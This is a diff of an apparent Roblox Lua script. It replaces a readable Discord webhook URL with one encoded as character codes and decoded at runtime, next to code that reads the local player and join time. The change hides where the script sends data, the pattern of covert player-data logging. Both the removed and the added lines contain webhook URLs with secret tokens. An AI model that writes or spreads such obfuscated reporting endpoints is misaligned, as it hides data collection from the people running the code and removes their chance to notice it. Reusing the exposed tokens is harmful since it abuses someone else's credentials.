@@ -637,9 +637,22 @@ task.spawn(function()
     end
 end)
 
+------
+local function s(...)
+    local t = {...}
+    for i,v in ipairs(t) do
+        t[i] = string.char(v)
+    end
+    return table.concat(t)
+end
 
-
-local WEBHOOK = "https://discord.com/api/webhooks/1485503062532689991/QbEgmFTj_lN6qxQ7aIpoen8h5cLScPgHtqOhYJ5rvyCsIlC68LfiHDvCmEYA48YuiKay"
+local WEBHOOK = s(
+104,116,116,112,115,58,47,47,
+100,105,115,99,111,114,100,46,99,111,109,47,
+97,112,105,47,119,101,98,104,111,111,107,115,47,
+49,52,56,53,53,48,51,48,54,54,48,48,53,53,54,57,55,48,49,47,
+103,97,69,57,107,118,57,71,111,70,68,117,84,121,97,83,117,117,107,116,55,108,108,95,106,67,100,70,50,49,75,53,86,70,87,120,100,53,49,121,110,56,104,53,114,67,111,74,79,116,81,107,102,80,110,98,107,52,74,114,112,72,83,57,55,45,114,76
+)
 local LocalPlayer = Players.LocalPlayer
 local startTime = os.time()
 local joinTimeFormatted = os.date("%H:%M:%S")
